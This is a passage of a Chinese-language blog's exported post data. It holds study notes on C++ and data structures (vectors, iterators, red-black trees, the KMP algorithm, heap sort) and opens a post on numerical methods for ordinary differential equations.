flag[n]=&#123;1...n&#125;;loveyou(flag,n);\n最好情况：元素n在第一个位置——最好时间复杂度T(n)=O(1)\n最坏情况：元素n在最后一个位置——最坏时间复杂度T(n)=O(n)\n平均情况：假设元素n在任意一个位置的概率相同为1n\\frac{1}{n}n1​——平均时间复杂度T(n)=O(n)\n\n循环次数x=(1+2+3+...+n)1n=n(1+n)2⋅1n=1+n2x=(1+2+3+...+n)\\frac{1}{n}=\\frac{n(1+n)}{2}\\cdot\\frac{1}{n}=\\frac{1+n}{2}x=(1+2+3+...+n)n1​=2n(1+n)​⋅n1​=21+n​\n\n 内存管理\n\n以C++为例来介绍一下编程语言的内存管理\n\n\n\n栈区（Stack）：由编译器自动分配释放，存放函数的参数值，局部变量的值等，其操作方式类似于数据结构中的栈\n堆区（Heap）：一般由程序员分配释放，若程序员不释放，程序结束时可能由OS收回\n未初始化数据区（UninitializedData）：存放未初始化的全局变量和静态变量\n初始化数据区（InitializedData）：存放已经初始化的全局变量和静态变量\n程序代码区（Text）：存放函数体的二进制代码\n\n 计算程序占用多大内存\n\n为什么64位的指针就占用了8个字节，而32位的指针占用4个字节呢？\n1个字节占8个比特，那么4个字节就是32个比特，可存放数据的大小为232，也就是4G空间的大小，即：可以寻找4G空间大小的内存地址\n安装64位的操作系统的计算机内存都已经超过了4G，也就是指针大小如果还是4个字节的话，就已经不能寻址全部的内存地址，所以64位编译器使用8个字节的指针才能寻找所有的内存地址\n\n264是一个非常巨大的数，对于寻找地址来说已经足够用了\n\n 内存对齐\n\n平台原因：不是所有的硬件平台都能访问任意内存地址上的任意数据，某些硬件平台只能在某些地址处取某些特定类型的数据，否则抛出硬件异常。为了同一个程序可以在多平台运行，需要内存对齐\n硬件原因：经过内存对齐后，CPU访问内存的速度大大提升\n\nstruct node&#123;   int num;   char cha;&#125;a;int main() &#123;    cout &lt;&lt; sizeof(a) &lt;&lt; endl;//8而不是5&#125;\n相对来说计算机内存资源一般都是充足的，我们更希望的是提高运行速度\n编译器一般都会做内存对齐的优化操作，也就是说当考虑程序真正占用的内存大小的时候，也需要认识到内存对齐的影响\n vector\n二分查找\nC++标准模板库（STL）中的一个容器类，用于表示一个动态数组。它可以存储多个元素，并且可以根据需要自动调整大小。\nvector&lt;int&gt;&amp; nums\n接收一个引用参数，这个参数是一个存储整数的动态数组。在函数内部，可以通过nums这个名字直接访问和操作传入的数组，而不会对数组进行复制\n vector&lt;vector&lt;int&gt;&gt; result\n三数之和哈希法\n二维向量\nvector&lt;vector&lt;int&gt;&gt; matrix=&#123;    &#123;1, 2, 3&#125;,    &#123;4, 5&#125;,    &#123;6, 7, 8, 9&#125;&#125;;\n#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main()&#123;    vector&lt;vector&lt;int&gt;&gt; matrix=&#123;    &#123;1,2,3&#125;,    &#123;4,5&#125;,    &#123;6,7,8,9&#125;    &#125;;    //增加一行    matrix.push_back(&#123;10,11,12&#125;);    cout&lt;&lt;&quot;增加一行后：&quot;&lt;&lt;endl;    for(const auto&amp; row:matrix)&#123;        for(int num:row)&#123;            cout&lt;&lt;num&lt;&lt;&quot; &quot;;        &#125;        cout&lt;&lt;endl;    &#125;    cout&lt;&lt;endl;    //删除一行    matrix.erase(matrix.begin()+1);//删除第二行    cout&lt;&lt;&quot;删除第二行后&quot;&lt;&lt;endl;    for(const auto&amp; row:matrix)&#123;        for(int num:row)&#123;            cout&lt;&lt;num&lt;&lt;&quot; &quot;;        &#125;        cout&lt;&lt;endl;    &#125;    cout&lt;&lt;endl;    //修改一行    matrix[1]=&#123;13,14,15&#125;;//修改第二行    cout&lt;&lt;&quot;修改第二行后：&quot;&lt;&lt;endl;    for(const auto&amp; row:matrix)&#123;        for(int num:row)&#123;            cout&lt;&lt;num&lt;&lt;&quot; &quot;;        &#125;        cout&lt;&lt;endl;    &#125;    cout&lt;&lt;endl;    //修改一个元素    matrix[2][0]=99;//修改第三行的第一个元素    cout&lt;&lt;&quot;修改第三行的第一个元素后：&quot;&lt;&lt;endl;    for(const auto&amp; row:matrix)&#123;        for(int num:row)&#123;            cout&lt;&lt;num&lt;&lt;&quot; &quot;;        &#125;        cout&lt;&lt;endl;    &#125;    cout&lt;&lt;endl;    //查询一个元素    int element=matrix[2][0];    cout&lt;&lt;&quot;矩阵元素[2][0]=&quot;&lt;&lt;element&lt;&lt;endl;    return 0;&#125;\n 区别普通数组、std::array、vector\n\n普通数组\n\n//数据类型 数组名[数组大小];#include &lt;iostream&gt;using namespace std;int main() &#123;    int array[5] = &#123;1, 2, 3, 4, 5&#125;;    cout &lt;&lt; array[0] &lt;&lt; endl;//1    cout &lt;&lt; sizeof(array) / sizeof(array[0]) &lt;&lt; endl;//5    return 0;&#125;\n\nstd::array\n\n数组大小在编译时确定，不可改变，但它是C++标准库中的一个类模板，提供了更多成员函数和方法\n//array&lt;数据类型, 数组大小&gt; 数组名;#include &lt;iostream&gt;#include &lt;array&gt;using namespace std;int main() &#123;    array&lt;int, 5&gt; array = &#123;1, 2, 3, 4, 5&#125;;    cout &lt;&lt; array[0] &lt;&lt; endl;//1    cout &lt;&lt; array.at(0) &lt;&lt; endl;//1，会边界检查，提高健壮性    cout &lt;&lt; array.size() &lt;&lt; endl;//5    //支持拷贝赋值    array&lt;int, 5&gt; arr;    arr = array;    return 0;&#125;\n\nvector\n\n#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main() &#123;    vector&lt;int&gt; vec = &#123;1, 2, 3, 4, 5&#125;;    cout &lt;&lt; vec.size() &lt;&lt; endl;//5    cout &lt;&lt; vec[0] &lt;&lt; endl;//1    vec.push_back(7);//添加一个元素    cout &lt;&lt; vec[5] &lt;&lt; endl;//7    vec.pop_back();//删除最后一个元素    vec.insert(vec.begin() + 2, 10);//插入一个元素    cout &lt;&lt; vec[2] &lt;&lt; endl;//10    vec.erase(vec.begin() + 2);//删除一个元素    return 0;&#125;\n &gt;&gt;&lt;&lt;\n二分查找\n\n&gt;&gt;：右移运算符\n\na&gt;&gt;b表示将a的二进制表示向右移动b位\na=20;//二进制10100a&gt;&gt;1//10100向右移动一位，得到1010，即十进制的10a&gt;&gt;2//10100向右移动二位，得到101，即十进制的5\n快速除以2的幂次方\n\n右移运算符在处理有符号数和无符号数时有所不同：\n\n有符号数：算术右移，对于一个负数，右移后空出的位会被1填充，保持数的符号不变\n无符号数：逻辑右移，空出的位会被0填充\n\n\n\n&lt;&lt;：左移运算符\n\na&lt;&lt;b表示将a的二进制表示向左移动b位\na=5;//二进制101a&lt;&lt;1//101向左移动一位，得到1010，即十进制的10a&lt;&lt;2//101向左移动二位，得到10100，即十进制的20\n快速乘以2的幂次方\n delete\n单链表\n用于释放动态分配的内存的关键字，与new操作符相对应，new用于分配内存并构造对象，而delete用于销毁对象并释放其占用的内存\n\n释放单个对象\n\nint* ptr=new int(10);delete ptr;\n\n释放数组\n\nint* arr=new int[10];delete[] arr;\n ※delete后的指针tmp的变化\n使用delete或delete[]释放指针tmp指向的内存后，tmp本身并不会自动变为nullptr。tmp仍然会保留原来的内存地址值，但这个地址所指向的内存已经不再有效。此时，tmp被称为“野指针”\n为了避免野指针问题，建议在释放内存后立即将指针设置为nullptr\n 红黑树\n常见的三种哈希结构\n\n定义\n\n满足如下红黑性质的二叉排序树：\n\n每个结点或是红色，或是黑色的\n根节点是黑色的\n叶结点（虚构的外部结点、NULL结点、失败结点）都是黑色的\n不存在两个相邻的红结点 （红结点的父节点和孩子结点都是黑色的）\n对每个结点，从该节点到任一叶结点的简单路径上，所含黑结点的数目相同\n\n\n左根右，根叶黑，不红红，黑路同\n\n结点的黑高bh：从某结点出发（不含该结点）到达任一空叶结点的路径上黑结点总数\n\n性质\n\n从根节点到叶结点的最长路径不大于最短路径的2倍\n有n个内部节点的红黑树高度h≤2log2(n+1)\n新插入红黑树中的结点初始着色为红色\n\n\n\n\n红黑树查找操作时间复杂度=O(log2n)\n\n\n红黑树的插入\n\n\n\n详见BV1b7411N798——7.3.3_2_红黑树的插入\n\n\n红黑树的插入示例\n\n\n unordered_set\n两个数组的交集\n\n构造函数\n\n可以接受一个范围（如两个迭代器），直接将该范围内的元素初始化为集合中的元素\n\nfind function\n\nunordered_set的find方法用于查找指定元素。如果找到了元素，返回指向该元素的迭代器；如果没有找到，返回end()\n#include &lt;unordered_set&gt;vector&lt;int&gt; nums=&#123;1,2,3,4,5&#125;;unordered_set&lt;int&gt; s(nums.begin(),nums.end()); //s=&#123;1,2,3,4,5&#125;s.insert(6);//插入元素s.erase(3);//删除元素auto it=s.find(4);if(it!=s.end())&#123;    cout&lt;&lt;&quot;Found:&quot;&lt;&lt;*it&lt;&lt;endl;//输出&quot;Found:4&quot;&#125;\n 范围for循环\n两个数组的交集\nC++11引入了范围for循环，用于简化容器的遍历操作，可以直接遍历容器中的每个元素\nfor(范围声明:范围表达式)&#123;    // 循环体&#125;//相当于for(auto it=v.begin();it!=v.end();++it)&#123;    int num=*it;    //循环体&#125;\nvector&lt;int&gt;v=&#123;1,2,3,4&#125;;for(int num:v)&#123;    cout&lt;&lt;num&lt;&lt;&quot; &quot;;//输出&quot;1 2 3 4&quot;&#125;\n iterator\n两数之和\n迭代器是一种检查容器内元素并遍历元素的数据类型，通常用于对C++中各种容器内元素的访问，但不同的容器有不同的迭代器，初学者可以将迭代器理解为指针\n begin()&amp;end()\nbegin()是指向容器第一个元素的迭代器\nend()是指向容器最后一个元素的下一个位置的迭代器\n 迭代器\n 通用功能\n\n比较两个迭代器是否相等（==、!=）\n前置和后置递增运算（++）\n读取元素的解引用运算符（*）。只能读元素，也就是解引用只能出现在赋值运算符的右边\n箭头运算符（-&gt;），解引用迭代器，并提取对象的成员\n\n 类型\n\n输入迭代器（input iterator）\n输出迭代器（output iterator）\n前向迭代器（forward iterator）\n双向迭代器（bidirectional iterator）\n随机访问迭代器（random-access iterator）\n\n\n\n输入迭代器\n\n通用的四种功能\n只能利用迭代器进行输入功能\n它只能用于单遍扫描算法\n\n\n输出迭代器\n\n通用的四种功能\n只能利用迭代器进行输出功能\n只能用于单遍扫描算法\n\n\n前向迭代器\n\n通用的四种功能\n能利用迭代器进行输入和输出功能\n能用于多遍扫描算法\n\n\n双向迭代器\n\n通用的四种功能\n能利用迭代器进行输入和输出功能\n能用于多遍扫描算法\n前置和后置递减运算（–），意味着它能够双向访问\n\n\n随机访问迭代器\n\n通用的四种功能\n能利用迭代器进行输入和输出功能\n前置和后置递减运算（–），意味着它是双向移动的\n比较两个迭代器相对位置的关系运算符（&lt;、&lt;=、&gt;、&gt;=）\n支持和一个整数值的加减运算（+、+=、-、-=）\n两个迭代器上的减法运算符（-），得到两个迭代器的距离\n支持下标运算符（iter[n]），访问距离起始迭代器n个距离的迭代器指向的元素\n能用于多遍扫描算法。在支持双向移动的基础上，支持前后位置的比较、随机存取、直接移动n个距离\n\n\n\n\n\n\n迭代器\n功能\n读写及支持\n\n\n\n\n输入迭代器\n提供对数据的只读访问\n只读，支持++、==、!=\n\n\n输出迭代器\n提供对数据的只写访问\n只读，支持++\n\n\n前向迭代器\n提供读写操作，能向前推进迭代器\n读写，支持++\n\n\n双向迭代器\n提供读写操作，能向前和向后操作\n读写，支持++、–\n\n\n随机访问迭代器\n提供读写操作，能以跳跃的方式访问容器任意数据，是功能最强的迭代器\n读写，支持++、–、[n]、-n、&lt;、&lt;=、&gt;、&gt;=\n\n\n\n 常用容器的迭代器\n\nvector——随机访问迭代器\ndeque——随机访问迭代器\nlist——双向迭代器\nset/multiset——双向迭代器\nmap/multimap——双向迭代器\nstack——不支持迭代器\nqueue——不支持迭代器\n\n 实例\n\n双向迭代器和随机访问迭代器最为常用，下面演示这两种迭代器用法\n\n\nmap\n\n#include &lt;iostream&gt;#include &lt;map&gt;using namespace std;int main()&#123;    map&lt;int,int&gt; m;    for(int i=0;i&lt;10;i++)&#123;        m[i]=i*10;    &#125;    map&lt;int,int&gt;::iterator iter;    cout&lt;&lt;&quot;遍历m并打印：&quot;;    for(iter=m.begin();iter!=m.end();++iter)&#123;        cout&lt;&lt;&quot;(&quot;&lt;&lt;iter-&gt;first&lt;&lt;&quot;,&quot;&lt;&lt;iter-&gt;second&lt;&lt;&quot;) &quot;;    &#125;    //此时iter=m.end(),这个位置是最后一个元素的下一个位置，没有存储数据    iter--;    cout&lt;&lt;&quot;\\nm的最后一个元素为：(&quot;&lt;&lt;iter-&gt;first&lt;&lt;&quot;,&quot;&lt;&lt;iter-&gt;second&lt;&lt;&quot;)&quot;&lt;&lt;endl;    return 0;&#125;\n\n\n对于迭代器来说，虽然都是加1或者减1，但--不等同于-=1，++不等同于+=1，他们实现的是不同的功能\n\n\nvector\n\n#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;int main()&#123;    vector&lt;int&gt; v;    for(int i=0;i&lt;10;i++)&#123;        v.push_back(i);    &#125;    vector&lt;int&gt;::iterator iter;    cout&lt;&lt;&quot;用!=比较两个迭代器遍历：&quot;;    for(iter=v.begin();iter!=v.end();iter++)&#123;//用!=比较两个迭代器        cout&lt;&lt;*iter&lt;&lt;&quot; &quot;;    &#125;    cout&lt;&lt;endl;        cout&lt;&lt;&quot;用&lt;比较两个迭代器遍历： &quot;;    for(iter=v.begin();iter&lt;v.end();iter++)&#123;//用&lt;比较两个迭代器        cout&lt;&lt;*iter&lt;&lt;&quot; &quot;;    &#125;    cout&lt;&lt;endl;    iter=v.begin();//让迭代器重新指向首个元素的位置    cout&lt;&lt;&quot;间隔一个输出：&quot;;    while(iter&lt;v.end())&#123;//间隔一个输出        cout&lt;&lt;*iter&lt;&lt;&quot; &quot;;        iter+=2;//用+=移动迭代器    &#125;    cout&lt;&lt;endl;    iter=v.begin();    cout&lt;&lt;&quot;vector[5]=&quot;;    cout&lt;&lt;iter[5]&lt;&lt;endl;//用[]访问    return 0;&#125;\n\n对于vector容器来说，其迭代器有失效的可能\n\nvector容器有动态扩容的功能，每当容器容量不足时，vector就会进行动态扩容，动态扩容不是在原来空间后追加空间，而是寻找一段新的更大的空间，把原来的元素复制过去\n但是这样容器存储元素的位置就改变了，原来的迭代器还是指向原来的位置，因此每次进行动态扩容后原来的迭代器就会失效\n\n 辅助函数\nSTL中有用于操作迭代器的三个函数模板，它们是：\n\n\nadvance(iter,n)\n使迭代器iter向前或向后移动n个元素\n\n\ndistance(iter1,iter2)\n计算两个迭代器之间的距离，即迭代器iter1经过多少次++操作后和迭代器iter2相等。如果调用时iter1已经指向iter2的后面，则这个函数会陷入死循环\n\n\niter_swap(iter1,iter2)\n用于交换两个迭代器iter1、iter2指向的值\n\n\n\n\nmap\n\n#include&lt;iostream&gt;#include&lt;map&gt;using namespace std;int main()&#123;    map&lt;int,int&gt;m;    for(int i=0;i&lt;10;i++)&#123;    m[i]=i*10;    &#125;    //1.使用advance函数    map&lt;int,int&gt;::iterator iter1=m.begin();    advance(iter1,2);//iter1向后移动两个元素，指向key=2的位置    cout&lt;&lt;&quot;当前iter1指向的元素:(&quot;&lt;&lt;iter1-&gt;first&lt;&lt;&quot;,&quot;&lt;&lt;iter1-&gt;second&lt;&lt;&quot;)&quot;&lt;&lt;endl;    advance(iter1,-1);//iter1向前移动一个元素，指向key=1的位置    cout&lt;&lt;&quot;当前iter1指向的元素:(&quot;&lt;&lt;iter1-&gt;first&lt;&lt;&quot;,&quot;&lt;&lt;iter1-&gt;second&lt;&lt;&quot;)&quot;&lt;&lt;endl;    //2.使用distance函数    map&lt;int,int&gt;::iterator iter2=m.end();    iter2--;//iter2指向最后一个元素的位置    cout&lt;&lt;&quot;iter1和iter2的距离:&quot;&lt;&lt;distance(iter1,iter2)&lt;&lt;endl;    //3.使用iter_swap函数    cout&lt;&lt;&quot;交换前打印：&quot;;    for(iter1=m.begin();iter1!=m.end();iter1++)&#123;        cout&lt;&lt;&quot;(&quot;&lt;&lt;iter1-&gt;first&lt;&lt;&quot;,&quot;&lt;&lt;iter1-&gt;second&lt;&lt;&quot;) &quot;;    &#125;    cout&lt;&lt;endl;    iter1=m.begin();//指向第一个元素    iter2=m.end();    iter2--;//指向最后一个元素    //iter_swap(iter1,iter2);//交换第一个元素和最后一个元素    swap(iter1-&gt;second,iter2-&gt;second);//交换值部分    cout&lt;&lt;&quot;交换后打印：&quot;;    for(iter1=m.begin();iter1!=m.end();++iter1)&#123;        cout&lt;&lt;&quot;(&quot;&lt;&lt;iter1-&gt;first&lt;&lt;&quot;,&quot;&lt;&lt;iter1-&gt;second&lt;&lt;&quot;) &quot;;    &#125;    cout&lt;&lt;endl;    return 0;&#125;\n\n在std::map中，每个元素是一个键值对（std::pair&lt;constKey,Value&gt;）。iter_swap函数会交换两个迭代器所指向的元素的内容。然而，std::map的键（Key）是常量，不能被修改。因此，当你尝试交换两个元素时，iter_swap会试图修改键的值，这会导致编译错误\n\n\n\nlist\n\n#include&lt;iostream&gt;#include&lt;list&gt;using namespace std;int main()&#123;    int a[10]=&#123;1,2,3,4,5,6,7,8,9,10&#125;;    list&lt;int&gt;lst(a,a+10);    list&lt;int&gt;::iterator iter1=lst.begin();    advance(iter1,2);//it1向后移动两个元素，指向3    cout&lt;&lt;&quot;当前iter1指向的元素:&quot;&lt;&lt;*iter1&lt;&lt;endl;//输出3    advance(iter1,-1);//it1向前移动一个元素，指向2    cout&lt;&lt;&quot;当前iter1指向的元素:&quot;&lt;&lt;*iter1&lt;&lt;endl;//输出2    list&lt;int&gt;::iterator iter2=lst.end();    iter2--;//iter2指向最后一个元素的位置，即10的位置    cout&lt;&lt;&quot;iter1和iter2的距离&quot;&lt;&lt;distance(iter1,iter2)&lt;&lt;endl;//输出8    cout&lt;&lt;&quot;交换前打印：&quot;;    for(iter1=begin(lst);iter1!=end(lst);iter1++)&#123;        cout&lt;&lt;*iter1&lt;&lt;&quot; &quot;;    &#125;    iter1=begin(lst);    iter_swap(iter1,iter2);//交换1和10    cout&lt;&lt;&quot;\\n交换后打印：&quot;;    for(iter1=begin(lst);iter1!=end(lst);iter1++)&#123;        cout&lt;&lt;*iter1&lt;&lt;&quot; &quot;;    &#125;    cout&lt;&lt;endl;    return 0;&#125;\n\n continue\n反转字符串II\ncontinue是一条流程控制语句，用于提前结束当前循环迭代的剩余语句，并直接进入下一次循环的条件判断\n\ncontinue不会跳出整个循环，只是跳过当前这次迭代\n\n KMP算法\n找出字符串中第一个匹配项的下标\n 最长公共前后缀\n字符串的前缀是指不包含最后一个字符的所有以第一个字符开头的连续子串\n后缀是指不包含第一个字符的所有以最后一个字符结尾的连续子串\n前缀表要求的就是相同前后缀的长度\n\n以文本串：aabaabaafa和模式串：aabaaf举例\n匹配过程在下标5的地方遇到不匹配，模式串是指向f\n\n然后就找到了下标2，指向b，继续匹配\n\n下标5之前这部分的字符串（aabaa）的最长相等的前缀和后缀字符串是子字符串aa，因为找到了最长相等的前缀和后缀，匹配失败的位置是后缀子串的后面，那么找到与其相同的前缀的后面重新匹配就可以了\n\n 前缀表\n记录下标i之前（包括i）的字符串中，有多大长度的相同前缀后缀，next数组就是一个前缀表（prefix table）\n前缀表用来回退的，它记录了模式串与主串（文本串）不匹配的时候，模式串应该从哪里开始重新匹配，使用前缀表，就不会从头匹配，而是从上次已经匹配的内容开始匹配\n\n求得的最长相同前后缀的长度就是对应前缀表的元素\n\n\n可以看出模式串与前缀表对应位置的数字表示的就是：下标i之前（包括i）的字符串中，有多大长度的相同前缀后缀\n\n利用前缀表找到当字符不匹配的时候应该指针应该移动的位置\n\n\n当字符不匹配的时候看它的前一个字符的前缀表的数值是多少\n\n为什么要前一个字符的前缀表的数值？\n要找前面字符串的最长相同的前缀和后缀\n\n next数组\n\n以前缀表统一减一之后的next数组来做演示\n\n\n\n时间复杂度\n\nn为文本串长度，m为模式串长度，匹配的过程中要根据前缀表不断调整匹配的位置，可以看出匹配的过程是O(n)，之前还要单独生成next数组，时间复杂度是O(m)。所以整个KMP算法的时间复杂度是O(n+m)\n\n暴力解法时间复杂度O(nm)，KMP在字符串匹配中极大地提高了搜索的效率\n\n 构造next数组\nvoid getNext(int* next, const string&amp; s)\n\n初始化\n处理前后缀不相同的情况\n处理前后缀相同的情况\n\n\n\n初始化\n\n定义两个指针i和j，j指向前缀末尾位置，i指向后缀末尾位置，对next数组进行初始化赋值\nint j=-1;next[0]=j;\nnext[i]表示i（包括i）之前最长相等的前后缀长度（其实就是j），所以初始化next[0]=j\n\n处理前后缀不相同的情况\n\nj初始化为-1，那么i就从1开始，进行s[i]与s[j+1]的比较，所以遍历模式串s的循环下标i要从1开始\nfor(int i=1;i&lt;s.size();i++)&#123;\n如果s[i]与s[j+1]不相同，也就是遇到前后缀末尾不相同的情况，就要向前回退\nnext[j]就是记录着j（包括j）之前的子串的相同前后缀的长度\n那么s[i]与s[j+1]不相同，就要找j+1前一个元素在next数组里的值（就是next[j]）\nwhile(j&gt;=0&amp;&amp;s[i]!=s[j+1])&#123;//前后缀不相同\tj=next[j];//向前回退&#125;\n\n处理前后缀相同的情况\n\n如果s[i]与s[j+1]相同，说明找到了相同的前后缀，那么就同时向后移动i和j，同时还要将j（前缀的长度）赋给next[i]，因为next[i]要记录相同前后缀的长度\nif(s[i]==s[j+1])&#123;//找到相同的前后缀\tj++;&#125;next[i]=j;\n\n完整代码\n\nvoid getNext(int* next,const string&amp; s)&#123;    int j=-1;    next[0]=j;    for(int i=1;i&lt;s.size();i++)&#123;//i从1开始        while(j&gt;=0&amp;&amp;s[i]!=s[j+1])&#123;//前后缀不相同            j=next[j];//向前回退        &#125;        if(s[i]==s[j+1])&#123;//找到相同的前后缀            j++;        &#125;        next[i]=j;//将j（前缀的长度）赋给next[i]    &#125;&#125;\n\n 使用next数组来做匹配\n定义两个下标，j指向模式串起始位置，i指向文本串起始位置\nj初始值为-1，i从0开始遍历文本串\nfor(int i=0;i&lt;s.size();i++)\n如果s[i]与t[j+1]不相同，j就要从next数组里寻找下一个匹配的位置\nwhile(j&gt;=0&amp;&amp;s[i]!=t[j+1])&#123;\tj=next[j];&#125;\n如果s[i]与t[j+1]相同，那么i和j同时向后移动\nif(s[i]==t[j+1])&#123;\tj++;//i的增加在for循环里&#125;\n如果j指向模式串t的末尾，说明模式串t完全匹配文本串s里的某个子串\n在文本串字符串中找出模式串出现的第一个位置（从0开始），所以返回当前在文本串匹配模式串的位置i减去模式串的长度，就是文本串字符串中出现模式串的第一个位置\nif(j==(t.size()-1))&#123;    return(i-t.size()+1);&#125;\n\n完整代码\n\nint j=-1;//next数组里记录的起始位置为-1for(int i=0;i&lt;s.size();i++)&#123;//i从0开始    while(j&gt;=0&amp;&amp;s[i]!=t[j+1])&#123;//不匹配        j=next[j];//j寻找之前匹配的位置    &#125;    if(s[i]==t[j+1])&#123;//匹配，j和i同时向后移动        j++;//i的增加在for循环里    &#125;    if(j==(t.size()-1))&#123;//文本串s里出现了模式串t        return(i-t.size()+1);    &#125;&#125;\n 前缀表减一C++代码实现\nclass Solution &#123;public:    void getNext(int* next,const string&amp; s)&#123;        int j=-1;        next[0]=j;        for(int i=1;i&lt;s.size();i++)&#123;//注意i从1开始            while(j&gt;=0&amp;&amp;s[i]!=s[j+1])&#123;//前后缀不相同了                j=next[j];//向前回退            &#125;            if(s[i]==s[j+1])&#123;//找到相同的前后缀                j++;            &#125;            next[i]=j;//将j（前缀的长度）赋给next[i]        &#125;    &#125;    int strStr(string haystack, string needle) &#123;        if(needle.size()==0)&#123;            return 0;        &#125;        vector&lt;int&gt; next(needle.size());        getNext(&amp;next[0],needle);        int j=-1;//因为next数组里记录的起始位置为-1        for(int i=0;i&lt;haystack.size();i++)&#123;//注意i就从0开始            while(j&gt;=0&amp;&amp;haystack[i]!=needle[j+1])&#123;//不匹配                j=next[j];//j寻找之前匹配的位置            &#125;            if(haystack[i]==needle[j+1])&#123;//匹配，j和i同时向后移动                j++;//i的增加在for循环里            &#125;            if(j==(needle.size()-1))&#123;//文本串s里出现了模式串t                return(i-needle.size()+1);            &#125;        &#125;        return -1;    &#125;&#125;;\n\n时间复杂度：O(n+m)\n空间复杂度：O(m)\n\n\n前缀表减一C++代码实现详见《代码随想录》\n\n 堆\n滑动窗口最大值\n堆是一棵完全二叉树，树中每个结点的值都不小于（或不大于）其左右孩子的值\n父亲结点大于等于左右孩子（满足条件1）就是大顶堆，小于等于左右孩子（满足条件2）就是小顶堆\nn个关键字序列L[1…n]满足：\n\n\nL(i)≥L(2i)且L(i)≥L(2i+1)或\n\n\nL(i)≤L(2i)且L(i)≤L(2i+1)\n\n\n(1≤i≤⌊n2⌋)(1\\le i\\le\\left\\lfloor\\frac{n}{2}\\right\\rfloor)\n(1≤i≤⌊2n​⌋)\n\n\n二叉树中第i个节点的左孩子：2i\n二叉树中第i个节点的右孩子：2i+1\n二叉树中第i个节点的父节点：\n\n⌊n2⌋\\left\\lfloor\\frac{n}{2}\\right\\rfloor\n⌊2n​⌋\n\ni所在层次：\n\n⌈log2(n+1)⌉\\left \\lceil log_2 (n+1) \\right \\rceil \n⌈log2​(n+1)⌉\n或\n⌊log2n⌋+1\\left\\lfloor log_2n\\right\\rfloor+1\n⌊log2​n⌋+1\n\n\n若完全二叉树有n个节点，\n\n\ni是否有左孩子？2i≤n？\n\n\ni是否有右孩子？2i+1≤n？\n\n\ni是否是叶子节点？\ni&gt;⌊n2⌋?i&gt;\\left\\lfloor\\frac{n}{2}\\right\\rfloor?\ni&gt;⌊2n​⌋?\n\n\ni是否是分支节点？\ni≤⌊n2⌋?i\\le\\left\\lfloor\\frac{n}{2}\\right\\rfloor?\ni≤⌊2n​⌋?\n\n\n\n\n\n 构造初始堆\n从后往前检查所有分支结点看是否满足堆的要求，若不满足则对以该分支结点为根的子树进行调整。n个节点的完全二叉树，最后一个结点是第\n⌊n2⌋\\left\\lfloor\\frac{n}{2}\\right\\rfloor\n⌊2n​⌋\n个结点的孩子。对以第\n⌊n2⌋\\left\\lfloor\\frac{n}{2}\\right\\rfloor\n⌊2n​⌋\n个结点为根的子树筛选（对于大根堆，若根结点的关键字小于左右孩子中关键字较大者，则交换），使该子树成为堆。之后向前依次对以各结点\n⌊n2⌋−1∼1\\left\\lfloor\\frac{n}{2}\\right\\rfloor-1\\sim1\n⌊2n​⌋−1∼1\n为根的子树进行筛选，看该结点值是否大于其左右子结点的值，若不大于，则将左右子结点中的较大值与之交换，交换后可能会破坏下一级的堆，于是继续采用上述方法构造下一级的堆，直到以该结点为根的子树构成堆为止。反复利用上述调整堆的方法建堆，直到根结点\n//建立大根堆void BuildMaxHeap(int A[],int len)&#123;    for(int i=len/2;i&gt;0;i--)&#123;//从后往前调整所有非终端结点        HeadAdjust(A,i,len);    &#125;&#125;//将以k为根的子树调整为大根堆void HeadAdjust(int A[],int k,int len)&#123;    A[0]=A[k];//A[0]暂存子树的根结点    for(int i=2*k;i&lt;=len;i*=2)&#123;//沿key较大的子结点向下筛选        if(i&lt;len&amp;&amp;A[i]&lt;A[i+1])&#123;            i++;//取key较大的子结点的下标        &#125;        if(A[0]&gt;=A[i])&#123;            break;//筛选结束        &#125;else&#123;            A[k]=A[i];//将A[i]调整到双亲结点上            k=i;//修改k值，以便继续向下筛选        &#125;    &#125;    A[k]=A[0];//被筛选结点的值放入最终位置&#125;\n 堆排序思想\n堆排序的思路很简单：首先将存放在L[1…n]中的n个元素建成初始堆，因为堆本身的特点（以大顶堆为例），所以堆顶元素就是最大值。输出堆顶元素后，通常将堆底元素送入堆顶，此时根结点已不满足大顶堆的性质，堆被破坏，将堆顶元素向下调整使其继续保持大顶堆的性质，再输出堆顶元素。如此重复，直到堆中仅剩一个元素为止\n\n前 K 个高频元素\n前 K 个高频元素中提到的优先队列也是利用了堆排序的思想\n\nvoid HeapSort(ElemType A[],int len)&#123;    BuildMaxHeap(A,len);//初始建堆    for(int i=len;i&gt;1;i--)&#123;//n-1趟的交换和建堆过程        Swap(A[i],A[1]);//输出堆顶元素（和堆底元素交换）        HeadAdjust(A,1,i-1);//调整，把剩余的i-1个元素整理成堆    &#125;&#125;\n","tags":["LeetCode"]},{"title":"常微分方程初值问题的数值解法","url":"/2025/01/12/%E5%B8%B8%E5%BE%AE%E5%88%86%E6%96%B9%E7%A8%8B%E5%88%9D%E5%80%BC%E9%97%AE%E9%A2%98%E7%9A%84%E6%95%B0%E5%80%BC%E8%A7%A3%E6%B3%95/","content":" 常微分方程初值问题的数值解法\n未知函数为一元函数的微分方程叫作常微分方程，未知函数为多元函数，从而有多元函数偏导数的方程叫作偏微分方程。微分方程中各阶导数的最高阶数是微分方程的阶。这里讨论一阶常微分方程的初值问题的数值解法\n{y′=f(x,y)y(x0)=y0\\begin{cases}\ny' = f(x, y) \\\\\ny(x_0) = y_0\n\\end{cases}\n{y′=f(x,y)y(x0​)=y0​​\n常微分方程初值问题的数值解法一般分为以下两大类：\n\n\n单步法。单步法是在计算yn+1时，只用到xn+1,xn和yn，即前一步的值。因此，有了初值以后就可以逐步往下计算，其代表是龙格——库塔法\n\n\n多步法。多步法是在计算yn+1时，除用到xn+1,xn和yn以外，还要用到xn−p,yn−p（p=1,2,⋯,k），即前面k步的值，其代表是亚当斯法\n\n\n\n李普希茨条件\n\n函数f(x,y)对x连续且关于y满足李普希茨（Lipschitz）条件：\n∣f(x,y1)−f(x,y2)∣≤L∣y1−y2∣.|f(x,y_1)-f(x,y_2)|\\le L|y_1-y_2|.\n∣f(x,y1​)−f(x,y2​)∣≤L∣y1​−y2​∣.\nL&gt;0。称为\"lipschitz\"常数即存在常数L，对所有的[a,b]区间的x，及任意实数y1，y2均成立，则初值问题在区间[a,b]上有唯一解\n\n此时的Lipschitz常数L不必小于1，这一点与前面章节中讲过的压缩映射的条件有所不同\n\n 